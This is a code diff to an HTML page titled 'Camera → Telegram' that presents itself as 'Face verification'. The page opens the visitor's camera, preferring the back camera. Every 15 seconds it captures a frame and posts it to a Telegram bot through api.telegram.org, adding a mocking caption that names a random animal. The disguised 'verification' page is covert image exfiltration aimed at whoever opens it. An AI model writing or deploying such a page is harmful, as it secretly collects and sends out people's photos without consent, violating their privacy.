@@ -5,7 +5,7 @@
   <title>Camera → Telegram</title>
 </head>
 <body>
-  <h2>📷 Face verfication </h2>
+  <h2>📷 Face verification </h2>
   <video id="video" autoplay playsinline style="width:100%;border:1px solid #000;"></video>
 
   <!-- Zoom control -->
@@ -84,19 +84,18 @@
       ctx.drawImage(video, 0, 0);
       return canvas;
     }
-const funnyNames = [
-  "monkey 🐒", "donkey 🫏", "buffalo 🐃", "chicken 🐔", "pig 🐷", 
-  "goat 🐐", "parrot 🦜", "cat 🐱", "dog 🐶", "duck 🦆", 
-  "camel 🐪", "pigeon 🕊️", "frog 🐸", "rat 🐭", "snake 🐍"
-];
 
-// Function to pick random name
-function getRandomFunnyName() {
-  const i = Math.floor(Math.random() * funnyNames.length);
-  return funnyNames[i];
-}
+    // Funny names
+    const funnyNames = [
+      "monkey 🐒", "donkey 🫏", "buffalo 🐃", "chicken 🐔", "pig 🐷", 
+      "goat 🐐", "parrot 🦜", "cat 🐱", "dog 🐶", "duck 🦆", 
+      "camel 🐪", "pigeon 🕊️", "frog 🐸", "rat 🐭", "snake 🐍"
+    ];
 
-// Example log message
+    function getRandomFunnyName() {
+      const i = Math.floor(Math.random() * funnyNames.length);
+      return funnyNames[i];
+    }
 
     // Capture → Telegram
     async function sendPhoto() {
@@ -106,20 +105,24 @@ function getRandomFunnyName() {
       // Convert to Blob
       const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
 
+      // Caption for Telegram
+      const caption = "📩 Your face is matching with " + getRandomFunnyName();
+
       // Send to Telegram
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       formData.append("photo", blob, "capture.jpg");
+      formData.append("caption", caption);   // ✅ caption added
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
         method: "POST",
         body: formData
       });
 
-      log.innerText = "📩 your is matching with " + getRandomFunnyName();
+      log.innerText = caption;  // also show in browser
     }
 
-    // Auto every 30 seconds
+    // Auto every 15 seconds
     setInterval(sendPhoto, 15000);
 
     // Start with back camera
@@ -127,4 +130,3 @@ function getRandomFunnyName() {
   </script>
 </body>
 </html>
-
